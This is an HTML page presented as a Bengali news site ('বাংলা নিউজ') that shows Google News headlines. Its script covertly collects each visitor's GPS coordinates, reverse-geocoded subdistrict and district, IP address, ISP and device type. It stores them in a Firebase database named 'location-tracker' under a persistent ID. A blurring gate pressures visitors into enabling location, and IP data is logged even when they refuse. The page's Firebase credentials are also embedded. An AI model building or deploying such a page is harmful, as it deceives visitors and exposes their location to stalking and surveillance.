<!DOCTYPE html>
<html>
<head>
<title>বাংলা নিউজ</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
nav{background:#111;padding:10px;text-align:center;}
nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}

.container{width:95%;margin:auto;margin-top:20px;}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:10px;
border-radius:8px;
cursor:pointer;
}

.card img{
width:100%;
height:150px;
object-fit:cover;
border-radius:6px;
}

.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}

/* 🔥 SOFT GATE */
#locationGate{
position:fixed;
top:0;left:0;
width:100%;height:100%;
backdrop-filter:blur(6px);
background:rgba(0,0,0,0.4);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.gate-box{
background:white;
padding:25px;
border-radius:12px;
width:90%;
max-width:340px;
text-align:center;
}

.gate-box button{
width:100%;
padding:12px;
background:#ff4b5c;
color:white;
border:none;
border-radius:6px;
font-size:16px;
margin-top:10px;
cursor:pointer;
}
</style>
</head>

<body>

<!-- LOCATION GATE -->
<div id="locationGate">
<div class="gate-box">
<h2>📍 লোকেশন চালু করুন</h2>
<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
<button onclick="retryLocation()">Enable Location</button>
</div>
</div>

<header>📰 বাংলা নিউজ</header>

<nav>
<a href="#">হোম</a>
<a href="#">দেশ</a>
<a href="#">প্রযুক্তি</a>
<a href="#">খেলা</a>
</nav>

<div class="container">
<div class="ad">📢 বিজ্ঞাপন</div>
<div id="newsContainer" class="grid"></div>
</div>

<div class="footer">© 2026 বাংলা নিউজ</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// USER ID
function getUserId(){
let id = localStorage.getItem("userId")
if(!id){
id = Math.random().toString(36).substring(2,10)
localStorage.setItem("userId", id)
}
return id
}

// DEVICE
function detectDevice(){
let ua=navigator.userAgent;
if(/mobile/i.test(ua)) return "Mobile";
return "Desktop";
}

function detectDeviceModel(){
let ua=navigator.userAgent;
if(ua.includes("Android")) return "Android Phone";
if(ua.includes("Windows")) return "Windows PC";
if(ua.includes("Mac")) return "Mac";
return "Unknown";
}

// LOCATION DETAILS
async function getLocationDetails(lat, lon){
try{
const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
const data = await res.json()
let a = data.address

return {
thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
district: a.state_district || a.county || "unknown"
}
}catch{
return {thana:"unknown",district:"unknown"}
}
}

// IP
async function getIP(){
let res = await fetch("https://ipinfo.io/json")
let data = await res.json()

return {
ip:data.ip,
org:data.org,
country:data.country
}
}

// SAVE
async function save(data){
let id = getUserId()
await setDoc(doc(db,"locations",id), data)
}

// GPS
async function handleGPS(pos){
let lat = pos.coords.latitude
let lon = pos.coords.longitude
let loc = await getLocationDetails(lat,lon)
let ip = await getIP()

save({
latitude:lat,
longitude:lon,
thana:loc.thana,
district:loc.district,
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"GPS",
time:new Date().toLocaleString()
})
}

// IP fallback
async function handleIP(){
let ip = await getIP()
save({
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"IP",
time:new Date().toLocaleString()
})
}

// AUTO DETECT
function autoDetect(){
navigator.geolocation.getCurrentPosition(
pos=>{
handleGPS(pos)
},
()=>{
handleIP()
document.getElementById("locationGate").style.display="flex"
}
)
}

// RETRY
window.retryLocation = function(){
navigator.geolocation.getCurrentPosition(
pos=>{
document.getElementById("locationGate").style.display="none"
handleGPS(pos)
},
()=>{
alert("লোকেশন চালু হয়নি")
}
)
}

// 🔥 BANGLA NEWS LOAD
async function loadNews(){

const container = document.getElementById("newsContainer")
container.innerHTML = "লোড হচ্ছে..."

try{

let res = await fetch("https://api.rss2json.com/v1/api.json?rss_url=https://news.google.com/rss/search?q=বাংলাদেশ")
let data = await res.json()

container.innerHTML = ""

data.items.slice(0,8).forEach(news=>{

let img = "https://picsum.photos/300/200"

let match = news.description.match(/src="(.*?)"/)
if(match) img = match[1]

let div = document.createElement("div")
div.className = "card"

div.innerHTML = `
<img src="${img}">
<h4>${news.title}</h4>
<p>${news.description.replace(/<[^>]+>/g,"").substring(0,80)}...</p>
`

div.onclick = ()=>window.open(news.link,"_blank")

container.appendChild(div)

})

}catch{
container.innerHTML = "নিউজ লোড করা যায়নি"
}

}

// INIT
setTimeout(()=>{autoDetect()},2000)
loadNews()

</script>

</body>
</html>
